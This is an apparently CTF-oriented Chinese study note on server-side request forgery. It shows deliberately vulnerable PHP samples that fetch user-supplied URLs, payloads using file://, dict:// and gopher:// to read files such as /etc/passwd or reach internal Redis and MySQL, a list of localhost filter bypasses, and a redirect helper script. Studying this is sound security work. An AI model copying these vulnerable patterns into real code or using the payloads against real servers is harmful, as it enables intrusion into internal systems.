##  SSRF

###  前言

 关于内网和外网的区别：
https://zhuanlan.zhihu.com/p/147282153

对于php伪协议的详解

[php伪协议 ](https://www.cnblogs.com/endust/p/11804767.html)

###  简介：
SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制
```
https://ctf-wiki.org/web/ssrf/
```
![](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/%E5%8D%9A%E5%AE%A2%2FSSRF%2F1615317124_6047c88468199a4aed8b7.jpg)

###  漏洞产生的相关函数



1.file_get_contents:按照文件路径输出文件内容
在伪协议中常用，php://input,data://

```php
<?php
if (isset($_POST['url'])) { 
    $content = file_get_contents($_POST['url']); 
    $filename ='./images/'.rand().';img1.jpg'; 
    file_put_contents($filename, $content); 
    echo $_POST['url']; 
    $img = "<img src=\"".$filename."\"/>"; 
}
echo $img;
?>
```
这段代码使用 file_get_contents 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。
2.fsockopen()
```php
fsockopen — 打开一个网络连接或者一个Unix套接字连接
说明
fsockopen(
    string $hostname,
    int $port = -1,
    int &$errno = ?,
    string &$errstr = ?,
    float $timeout = ini_get("default_socket_timeout")
): resource
返回值:
fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。
```
```php
<?php 
function GetFile($host,$port,$link) { 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
    if (!$fp) { 
        echo "$errstr (error number $errno) \n"; 
    } else { 
        $out = "GET $link HTTP/1.1\r\n"; 
        $out .= "Host: $host\r\n"; 
        $out .= "Connection: Close\r\n\r\n"; 
        $out .= "\r\n"; 
        fwrite($fp, $out); 
        $contents=''; 
        while (!feof($fp)) { 
            $contents.= fgets($fp, 1024); 
        } 
        fclose($fp); 
        return $contents; 
    } 
}
?>
```
3.curl_exec()协议：
```php
<?php 
if (isset($_POST['url'])) {
    $link = $_POST['url'];
    $curlobj = curl_init();
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
    $result=curl_exec($curlobj);
    curl_close($curlobj);

    $filename = './curled/'.rand().'.txt';
    file_put_contents($filename, $result); 
    echo $result;
}
?>
```
4.PHP内置类：
[SoapClient](https://www.xiinnn.com/article/7741c455.html)

5.readfile()和fopen函数

###  SSRF中的协议
[URL协议](https://www.cnblogs.com/-mo-/p/11673190.html)
[PHP伪协议](https://www.cnblogs.com/-mo-/p/11673190.html)

#### dict://协议：
可以用来探测端口的开放信息和指纹信息,操作内网访问。
dict://serverip:port/命令:参数向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。

[dict协议打redis](https://www.cnblogs.com/zzjdbk/p/12970919.html)

####  file://协议
可以访问本地文件（相对路径和绝对路径都可以）
比如：
url=file:///etc/passwd（敏感信息）
url=file:///var/www/html/flag.php(一般网站的路径)
url=file://D:/Desktop/flag.php(绝对路径)

####  http://和https://

可以来探测内网主机存活和端口开放情况

```
比如可以用什么爆破端口来直接判断端口开放情况，也可以判断内网主机存活
```

结构：http://host:port/path/?query=value#anchor

#### file协议和http协议的区别
```php
file 协议与 http 协议的区别 ¶
（1）file 协议主要用于读取服务器本地文件，访问的是本地的静态资源
（2）http 是访问本地的 html 文件，简单来说 file 只能静态读取，http 可以动态解析
（3）http 服务器可以开放端口，让他人通过 http 访问服务器资源，但 file 不可以
（4）file 对应的类似 http 的协议是 ftp 协议（文件传输协议）
（5）file 不能跨域
```
####  gopher://协议
定义：gopher协议是一种信息查找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面。

gopher协议的格式：gopher://IP:port/_TCP/IP数据流
```
gopher协议发送http get请求
构造HTTP数据包
URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束---回车换行
```
发送gopher协议, 协议后的IP一定要接端口
```
发送http post请求
POST与GET传参的区别：它有4个参数为必要参数
需要传递Content-Type,Content-Length,host,post的参数
而且其中Content-Length，需要跟post的内容长度相同  ---重要
```
### 绕过姿势：

这是对`ip地址`进行过滤的bypass

```
1.进制转换
十六进制
url=http://0x7F.0.0.1/flag.php
八进制
url=http://0177.0.0.1/flag.php
10 进制整数格式
url=http://2130706433/flag.php
16 进制整数格式，还是上面那个网站转换记得前缀0x
url=http://0x7F000001/flag.php

2.特殊模式
url=http://127.1/flag.php
url=http://0/flag.php
url=http://127.0000000000000.00.1/flag.php

3.0.0.0.0绕过
url=http://0.0.0.0/flag.php

4.用CIDR绕过localhost
url=http://127.127.127.127/flag.php

5.短标签绕过
http://dwz.cn/11SMa==>http://127.0.0.1（网上有转换工具）

6.使用@来绕过，可以针对限制了网址的题
http://www.baidu.com@127.0.0.1/与http://127.0.0.1请求的都是127.0.0.1的内容

7.可以指向任意 ip 的域名xip.io：
http://127.0.0.1.xip.io/==>http://127.0.0.1/

8.利用句号。：
127。0。0。1==>127.0.0.1

9.ipv6绕过[::1]
10.DNS重绑定
11.利用 Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```
###  攻击内网应用
```php
redis,fastcgi,mysql,postgresql,zabbix,pymemcache,smtp
```
###  危害

```
可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息;
攻击运行在内网或本地的应用程序（比如溢出）;
对内网 web 应用进行指纹识别，通过访问默认文件实现;
攻击内外网的 web 应用，主要是使用 get 参数就可以实现的攻击（比如 struts2，sqli 等）;
利用 file 协议读取本地文件等。
```

###  利用SSRF进行端口扫描
根据服务器的返回信息进行判断，大部分应用不会判别端口，可通过返回的 banner 信息判断端口状态。
前端实现

```php
<html>
<body>
  <form name="px" method="post" action="http://127.0.0.1/ss.php">
    <input type="text" name="url" value="">
    <input type="submit" name="commit" value="submit">
  </form>
  <script></script>
</body>
</html>
```
后端实现
```php
<?php 
if (isset($_POST['url'])) {
    $link = $_POST['url'];
    $filename = './curled/'.rand().'txt';
    $curlobj = curl_init($link);
    $fp = fopen($filename,"w");
    curl_setopt($curlobj, CURLOPT_FILE, $fp);
    curl_setopt($curlobj, CURLOPT_HEADER, 0);
    curl_exec($curlobj);
    curl_close($curlobj);
    fclose($fp);
    $fp = fopen($filename,"r");
    $result = fread($fp, filesize($filename)); 
    fclose($fp);
    echo $result;
}
?>
```
请求非 HTTP 的端口可以返回 banner 信息。
或可利用 302 跳转绕过 HTTP 协议的限制。
辅助脚本

```php
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data");
?>
```

##  参考文献：

https://xz.aliyun.com/t/6373#toc-8
###  ctfhub wp
https://blog.csdn.net/rfrder/category_10388286.html
https://www.freebuf.com/articles/web/265646.html